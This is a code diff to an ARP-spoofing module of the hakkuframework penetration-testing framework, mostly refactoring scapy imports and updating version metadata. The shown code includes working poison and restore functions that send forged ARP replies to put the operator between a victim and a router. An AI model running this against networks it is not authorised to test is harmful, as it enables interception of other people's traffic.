@@ -1,22 +1,28 @@
 # Copyright (C) 2015 – 2021 Noa-Emil Nissinen (4shadoww)
-from core.hakkuframework import *
-from core import colors
-from scapy.all import *
-from scapy.all import conf as sconf
-import threading, queue
+
+import threading
+import queue
 import time
 import netifaces
+import os
+
+import scapy.all as scapy
+from scapy.all import conf as sconf
+
+
 from core.exceptions import *
+from core.hakkuframework import *
+from core import colors
 
 conf = {
     "name": "arp_spoof",
-    "version": "1.0",
+    "version": "1.1",
     "shortdesc": "arp spoof",
     "github": "4shadoww",
     "author": "4shadoww",
     "email": "4shadoww0@gmail.com",
-    "initdate": "10.3.2016",
-    "lastmod": "3.1.2017",
+    "initdate": "2016-03-10",
+    "lastmod": "2021-07-11",
     "apisupport": True,
     "needroot": 1
 }
@@ -66,7 +72,7 @@ class SpoofController(threading.Thread):
 
         sconf.verb = 0
         try:
-            ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst = ips), timeout = 2,iface=variables["interface"][0],inter=0.1)
+            ans, unans = scapy.srp(scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst = ips), timeout = 2,iface=variables["interface"][0],inter=0.1)
         except PermissionError:
             self.controller.kill = True
             self.controller.error = "permission error"
@@ -109,17 +115,17 @@ class ArpSpoofer(threading.Thread):
         threading.Thread.__init__(self)
 
     def originalMAC(self, ip):
-        ans, unans = arping(ip, verbose=0)
+        ans, unans = scapy.arping(ip, verbose=0)
         for s,r in ans:
-            return r[Ether].src
+            return r[scapy.Ether].src
 
     def poison(self, routerIP, victimIP, routerMAC, victimMAC):
-        send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC), verbose=0)
-        send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC), verbose=0)
+        scapy.send(scapy.ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC), verbose=0)
+        scapy.send(scapy.ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC), verbose=0)
 
     def restore(self, routerIP, victimIP, routerMAC, victimMAC):
-        send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=3, verbose=0)
-        send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=routerMAC), count=3, verbose=0)
+        scapy.send(scapy.ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=3, verbose=0)
+        scapy.send(scapy.ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=routerMAC), count=3, verbose=0)
 
     def run(self):
         routerMAC = self.originalMAC(self.router)
@@ -170,17 +176,15 @@ def stop(args):
     print_info("arp spoof ended")
 
 def get(args):
-    if args[0] == "status":
+    if len(args) != 0 and args[0] == "status":
         if controller.error == None and controller.kill == False:
             print_info("attack is running")
             return "attack is running"
         elif controller.error == None and controller.kill == True:
             print_info("attack in ended")
-            os.system('echo "0" >> /proc/sys/net/ipv4/ip_forward')
             return "attack in ended"
         elif controller.error != None:
             print_error("faced error: "+controller.error)
-            os.system('echo "0" >> /proc/sys/net/ipv4/ip_forward')
             return ModuleError(controller.error)
 
     else:
